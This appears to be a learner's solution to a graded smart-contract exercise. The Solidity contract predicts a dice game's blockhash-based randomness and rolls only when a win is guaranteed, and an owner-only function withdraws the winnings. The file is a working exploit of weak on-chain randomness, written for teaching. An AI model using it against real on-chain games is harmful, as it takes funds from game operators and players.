pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    error RiggedRoll__NotRigthTime();

    uint256 public minimalValue = 0.002 ether;

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    function withdraw(address _addr, uint256 _amount) external onlyOwner() {
        require (address(this).balance>=_amount,"RiggedRoll: Balance less than amount to withdraw");
        (bool success,)=_addr.call{value:_amount}("");
        require(success,"RiggedRoll: Withdraw Failed");

    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
    require (address(this).balance >= .002 ether,"RiggedRoll: Not Enougth ETH on contract");
    bytes32 prevHash = blockhash(block.number - 1);
    uint256 nonce = diceGame.nonce();
    bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
    uint256 roll = uint256(hash) % 16;

    console.log("\t", "   Dice Game Roll:", roll);

    if (roll<=5){
        (bool success,)= address(diceGame).call {value: minimalValue} (abi.encodeWithSignature("rollTheDice()"));
        require (success,"DiceGame: Roll Rigged Failed");

    } else
    {revert RiggedRoll__NotRigthTime();}

    }
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() payable external {}

}
